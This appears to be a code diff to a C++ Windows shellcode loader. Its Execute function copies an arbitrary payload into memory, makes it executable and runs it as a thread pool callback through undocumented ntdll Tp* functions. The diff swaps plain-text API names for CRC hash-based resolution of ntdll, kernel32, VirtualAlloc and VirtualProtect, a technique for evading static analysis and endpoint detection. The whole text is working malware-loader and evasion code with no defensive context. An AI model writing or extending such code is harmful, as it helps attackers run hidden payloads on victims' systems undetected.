@@ -9,6 +9,7 @@
 // 
 
 #include "ThreadPool.h"
+#include "ApiResolver.h"
 
 namespace ThreadPool
 {
@@ -19,28 +20,36 @@ namespace ThreadPool
     typedef NTSTATUS(NTAPI* pTpAllocPool)(void** pool, void* reserved);
     typedef void(NTAPI* pTpReleasePool)(void* pool);
 
+    // Typedefs for dynamically resolved memory functions
+    typedef LPVOID (WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+    typedef BOOL   (WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
+
     void Execute(void* payload, size_t size)
     {
         if (!payload || size == 0) return;
 
-        // Resolve ntdll — stack-built
-        char ntStr[] = { 'n','t','d','l','l','.','d','l','l', 0 };
-        HMODULE hNtdll = GetModuleHandleA(ntStr);
+        // Resolve ntdll
+        HMODULE hNtdll = Api::GetModuleByHashCrc(Api::CrcMod::NTDLL);
         if (!hNtdll) return;
 
-        // Resolve Tp functions — stack-built names
-        char s1[] = { 'T','p','A','l','l','o','c','W','o','r','k', 0 };
-        char s2[] = { 'T','p','P','o','s','t','W','o','r','k', 0 };
-        char s3[] = { 'T','p','R','e','l','e','a','s','e','W','o','r','k', 0 };
-
-        auto fnAlloc   = (pTpAllocWork)GetProcAddress(hNtdll, s1);
-        auto fnPost    = (pTpPostWork)GetProcAddress(hNtdll, s2);
-        auto fnRelease = (pTpReleaseWork)GetProcAddress(hNtdll, s3);
+        // Resolve Tp functions
+        auto fnAlloc   = (pTpAllocWork)Api::GetProcByHashCrc(hNtdll, Api::CrcFn::TpAllocWork);
+        auto fnPost    = (pTpPostWork)Api::GetProcByHashCrc(hNtdll, Api::CrcFn::TpPostWork);
+        auto fnRelease = (pTpReleaseWork)Api::GetProcByHashCrc(hNtdll, Api::CrcFn::TpReleaseWork);
 
         if (!fnAlloc || !fnPost || !fnRelease) return;
 
+        // Resolve kernel32 memory functions
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) return;
+
+        auto fnVirtualAlloc   = (pVirtualAlloc)Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualAlloc);
+        auto fnVirtualProtect = (pVirtualProtect)Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualProtect);
+
+        if (!fnVirtualAlloc || !fnVirtualProtect) return;
+
         // Allocate executable memory for the payload
-        void* execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        void* execMem = fnVirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!execMem) return;
 
         // Copy payload
@@ -48,7 +57,7 @@ namespace ThreadPool
 
         // Change to executable
         DWORD oldProtect;
-        VirtualProtect(execMem, size, PAGE_EXECUTE_READ, &oldProtect);
+        fnVirtualProtect(execMem, size, PAGE_EXECUTE_READ, &oldProtect);
 
         // Allocate thread pool work item with payload as callback
         void* work = nullptr;
